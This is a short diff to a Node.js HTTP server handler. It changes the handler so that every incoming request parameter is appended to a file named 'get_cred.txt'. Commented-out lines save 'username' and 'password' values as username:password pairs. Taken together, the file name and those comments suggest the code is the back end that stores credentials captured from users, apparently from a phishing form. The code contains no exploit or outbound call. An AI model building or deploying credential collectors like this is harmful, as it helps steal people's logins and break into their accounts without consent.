@@ -33,11 +33,27 @@ var server = http.createServer(function(request, response) {
         /**
          * http://mysite/add?name=Ahmed
          */
-        console.log(request.params)
+        console.log(request.params['id'] + "", request.params['msg'] + "")
+            // var string = JSON.stringify(request.params);
+
+        Object.keys(request.params).forEach(function(key) {
+            fs.appendFile('get_cred.txt', key + " : " + request.params[key] + "\n", (err) => {
+                console.log(err)
+            })
+        });
 
 
+        fs.appendFile('get_cred.txt', "\n", (err) => {
+                console.log(err)
+            })
+            // var username = request.params['username']
+            // var password = request.params['password']
 
-        // fs.appendFile('newfile.txt', request.params, (err) => {
+        // fs.appendFile('get_cred.txt', username + ":" + password, (err) => {
+        //     console.log(err)
+        // })
+
+        // fs.appendFile('get_cred.txt', username + ":" + password, (err) => {
         //     console.log("couldnt save")
         // })
 
